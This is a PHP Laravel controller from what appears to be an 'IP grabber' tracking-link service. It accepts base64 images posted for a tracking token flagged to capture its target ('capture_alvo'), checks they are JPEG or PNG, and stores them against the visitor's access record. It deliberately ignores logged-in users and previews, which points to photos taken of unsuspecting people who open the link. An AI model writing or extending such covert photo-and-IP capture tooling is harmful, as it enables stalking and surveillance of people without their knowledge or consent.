<?php

namespace App\Http\Controllers;

use App\Models\IpGrabber;
use App\Models\IpGrabberFoto;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;

class IpGrabberFotoController extends Controller
{
    // Tamanho máximo do base64: ~5.5 MB (≈ 4 MB de JPEG)
    private const MAX_BASE64_LENGTH = 5_800_000;

    public function store(Request $request, string $token): JsonResponse
    {
        // Rejeita preview manual, usuários autenticados e métodos não-POST
        if ($request->boolean('preview') || $request->user() || ! $request->isMethod('POST')) {
            return response()->json(['ok' => false], 403);
        }

        $ipGrabber = IpGrabber::where('token', $token)->first();

        if (! $ipGrabber || ! $ipGrabber->capture_alvo) {
            return response()->json(['ok' => false], 404);
        }

        $base64Raw = $request->input('foto');

        if (! is_string($base64Raw) || strlen($base64Raw) > self::MAX_BASE64_LENGTH) {
            return response()->json(['ok' => false, 'erro' => 'Payload inválido.'], 422);
        }

        // Remove o prefixo data:image/jpeg;base64, se presente
        $base64 = preg_replace('/^data:image\/\w+;base64,/', '', $base64Raw);
        $binario = base64_decode($base64, strict: true);

        if ($binario === false || strlen($binario) < 100) {
            return response()->json(['ok' => false, 'erro' => 'Base64 inválido.'], 422);
        }

        // Valida que é realmente uma imagem (magic bytes JPEG ou PNG)
        if (! $this->ehImagemValida($binario)) {
            return response()->json(['ok' => false, 'erro' => 'Arquivo não reconhecido como imagem.'], 422);
        }

        try {
            $uuid      = Str::uuid();
            $extensao  = $this->detectarExtensao($binario);
            $path      = "pixel-fotos/{$token}_{$uuid}.{$extensao}";

            Storage::disk('public')->put($path, $binario);

            $accessUuid = $request->input('access_id');

            IpGrabberFoto::create([
                'pixel_track_id' => $ipGrabber->id,
                'access_uuid'    => is_string($accessUuid) && Str::isUuid($accessUuid) ? $accessUuid : null,
                'path'           => $path,
            ]);

            return response()->json(['ok' => true]);
        } catch (\Throwable $e) {
            Log::warning("IpGrabberFoto: erro ao salvar foto [{$token}]: " . $e->getMessage());

            return response()->json(['ok' => false, 'erro' => 'Erro interno.'], 500);
        }
    }

    private function ehImagemValida(string $binario): bool
    {
        // JPEG: FF D8 FF
        if (str_starts_with($binario, "\xFF\xD8\xFF")) {
            return true;
        }

        // PNG: 89 50 4E 47 0D 0A 1A 0A
        if (str_starts_with($binario, "\x89PNG\r\n\x1A\n")) {
            return true;
        }

        return false;
    }

    private function detectarExtensao(string $binario): string
    {
        return str_starts_with($binario, "\xFF\xD8\xFF") ? 'jpg' : 'png';
    }
}
